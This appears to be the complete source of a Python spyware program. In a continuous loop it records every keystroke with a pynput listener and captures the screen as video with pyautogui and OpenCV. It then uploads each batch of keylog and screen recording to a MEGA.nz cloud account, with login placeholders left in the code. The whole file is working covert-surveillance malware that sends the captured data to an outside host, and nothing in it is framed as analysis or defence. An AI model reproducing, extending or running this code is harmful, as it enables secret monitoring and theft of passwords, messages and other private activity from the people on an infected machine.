import os
import threading
import cv2
import numpy as np
import pyautogui
from shutil import rmtree
from datetime import datetime
from time import sleep

#keylogger libs
from pynput.keyboard import Key, Listener
import logging as lg
#upload
from mega import Mega

#-- Restart path ---
try:
    rmtree("spy/")
    os.mkdir("spy/")
except:
    os.mkdir("spy/")
#-- Restart path --- (End)
    
#-- Time log--- (End)
record_seconds=60 #30 minutes
#-- Time log--- (End)

#*****upload function
def loginUpload():
    global m
    mega=Mega()
    m=mega.login("MEGA.NZ_EMAIL","MEGA.NZ_PASSWORD")
threading.Thread(target=loginUpload).start()
def upload(path):
    for i in range(1):
        #print(i)
        m.create_folder(path)
        folder = m.find(path)
        m.upload(path+"/"+os.listdir(path)[0],folder[0])
        m.upload(path+"/"+os.listdir(path)[1],folder[0])
        #rmtree("spy/"+i)
#*****upload function(End)
#*****keylogger function
def setup_logger(logger_name, log_file, level=lg.INFO):
    l = lg.getLogger(logger_name)
    formatter = lg.Formatter('%(asctime)s : %(message)s')
    fileHandler = lg.FileHandler(log_file, mode='w')
    fileHandler.setFormatter(formatter)
    streamHandler = lg.StreamHandler()
    streamHandler.setFormatter(formatter)

    l.setLevel(level)
    l.addHandler(fileHandler)
    l.addHandler(streamHandler)    


def klog(file,directory):
    def on_press(key):
        #print(lg.info(str(key)))
        lg.getLogger(logname).info(str(key))
    #print("-----start-----")
    log_dir = directory
    logname= log_dir+"/"+file+".txt"
    setup_logger(logname,logname)
    th1= Listener(on_press=on_press)
    th1.start()
    sleep(record_seconds)
    th1.stop()
    #print("stopped")
#*****keylogger function(End)
#*****screen function
def screen():
    # display screen resolution, get it using pyautogui itself
    SCREEN_SIZE = tuple(pyautogui.size())
    # define the codec
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    # frames per second
    fps = 6.0
    # create the video write object
    out = cv2.VideoWriter("{}".format(patH)+"/{}(scr).avi".format(datetime.today().strftime('%Yyear%Hhr-%Mmins-%Ssec')), fourcc, fps, (SCREEN_SIZE))
    # the time you want to record in seconds
    #record_seconds = 1800 #30 minutes
    #record_seconds = 20 #1 minutes

    for i in range(int(record_seconds * fps)):
        # make a screenshot
        img = pyautogui.screenshot()
        # convert these pixels to a proper numpy array to work with OpenCV
        frame = np.array(img)
        # convert colors from BGR to RGB
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        # write the frame
        out.write(frame)
        # show the frame
        #cv2.imshow("screenshot", frame)
        # if the user clicks q, it exits
        if cv2.waitKey(1) == ord("q"):
            break

    # make sure everything is closed when exited
    cv2.destroyAllWindows()
    out.release()
#*****screen function(end)
#*****Main
while True:
    try:
        patH= "spy/"+datetime.today().strftime('%Yyear%Hhr-%Mmins-%Ssec')
        name= "{}(key)".format(datetime.today().strftime('%Yyear%Hhr-%Mmins-%Ssec'))
        os.makedirs(patH)
        process=threading.Thread(target=klog, args=(name,patH,))
        process.start()
        screen()
        threading.Thread(target=upload,args=(patH,)).start()
        name= ""
        patH=""
    except:
        threading.Thread(target=upload,args=(patH,)).start()
        name= ""
        patH=""
        continue
#*****Main(End)

        
